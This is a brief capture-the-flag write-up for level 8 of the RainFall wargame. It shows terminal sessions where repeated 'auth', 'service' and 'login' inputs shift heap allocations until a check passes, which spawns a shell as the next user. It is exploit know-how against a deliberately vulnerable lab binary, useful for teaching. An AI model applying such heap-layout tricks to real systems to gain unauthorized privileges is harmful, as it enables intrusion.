# Level 8


This challenge is kinda ambiguous, but the goal is to to write in auth[32] to reach the system call.

```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth        
0x804a008, (nil) 
service
0x804a008, 0x804a018
```

The distance between auth and service is 16 bytes, and calling service again will distance them by 16 bytes again so auth[32] will contain some value.

```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth        
0x804a008, (nil) 
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$ whoami
level9
```
